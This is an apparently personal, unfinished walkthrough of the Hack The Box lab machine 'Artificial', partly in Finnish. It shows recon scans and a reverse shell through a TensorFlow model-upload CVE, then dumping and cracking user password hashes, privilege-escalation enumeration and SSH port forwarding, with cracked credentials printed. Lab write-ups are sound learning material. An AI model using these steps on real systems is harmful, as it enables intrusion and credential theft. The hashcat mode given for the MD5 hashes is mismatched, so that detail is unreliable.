I started by doing an nmap scan to see whats going on.
```bash
nmap -p- -sC -sV -vv -T4-min-rate=10000 10.10.11.74
```
This scan revealed that we have 2 ports open
```bash
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp    open     http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
Next step is to check out the web page. and do a scan on it aswell...
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://artificial.htb -t 100
```
Whilst the scan was running I checked the source code for the website, but didn't find anything interesting. BUT the scan revealed something quite intriguing. 
```bash
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
```
I decided to run an additional scan on the login page since I felt like I had nothing to work with, but there was nothing.
I decided to create an account for their website to see what I could find after being logged in.

The website offers for you to send files over and im guessing that we can use thatto exploit and gain a reverse shell. I hope they don't do crazy amounts of checking the type of files being sent, but we'll see.

They do check the filetypes so i decided to open up the burpsuite to make the workeasier to see what type of files are acceptable. But I got no results.
I decided to look more into the requirements.txt the site provided and inside it read the following
```bash
tensorflow-cpu==2.13.1
```
To be completely honest I had no idea what it meant so i decided to google it. AndI found that it has an CVE. https://github.com/Splinter0/tensorflow-rce

To be honest it took me forever to get the reverse shell. Most of my problems were that I wasn't able to install certain modules to run the exploit.py script so I had to learn to use Docker. But after that all I had to do was send the exploit.h5 file over and set up netcat and we are inside the machine...
Improving the shells 
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
After enumerating the machine for a while I found a users.db file and opened it with sqlite3. Inside we found the following
```bash
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|test11|test11@hackthebox.com|f696282aa4cd4f614aa995190cf442fe
7|test111@test.com|test111@test.com|4061863caf7f28c0b0346719e764d561
8|Hacker 1|hacker1@ai.htb|2ba2a8ac968a7a2b0a7baa7f2fef18d2
9|kingfish|tociwa5900@mytaemin.com|25a70491971b0e087d3b605df08e16dc
10|Dims|user@gmail.com|a01610228fe998f515a72dd730294d87
```
We only care about the password of Gael, because he had an user inside the machine.
```bash
hashcat -m 500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
AND the password is c99175974b6e192936d97224638a34f8:mattp005numbertwo
I logged in using ssh and i found the first flag. Then i decided to transfer linpeass over to automate the search for privescalation. 
```bash
python3 -m http.server 8000
```
and then i changed the permission chmod +x linpeas.sh to make it executable and let it rip throught.

This is usually the most difficult part for me and usually I get stuck here. But these things caught my eye
```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root gael 33 Jul 11 15:30 /home/gael/user.txt                                                            
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                              
drwxr-xr-x  3 root root 4096 Mar  4 22:19 .
drwxr-xr-x 18 root root 4096 Mar  3 02:50 ..
drwxr-xr-x  5 root root 4096 Jul 11 16:00 backrest

/opt/backrest/processlogs/backrest.log
```
Tärkeäksi osottautui tuo /var/backups/backrest_backup.tar.gz, sillä kun sen vein toiseen hakemistoon pystyimme lukemaan sieltä tärkeän config.json tiedoston, jota aikasemmin emmevoineet lukea, sillä nyt meillä on oikeudet lukea se.
se sisälsi
```bash
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```
Next step is to crack the password
```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
```
```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
the password is !@#$%^
Next step was to start the backrest machine and it starts on the localhost 127.0.0.1 so we have to use port forwarding.
```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```
And we visit the page and log in with the credentials we gathered just before..

KESKEN LIIAN VAIKEEEE
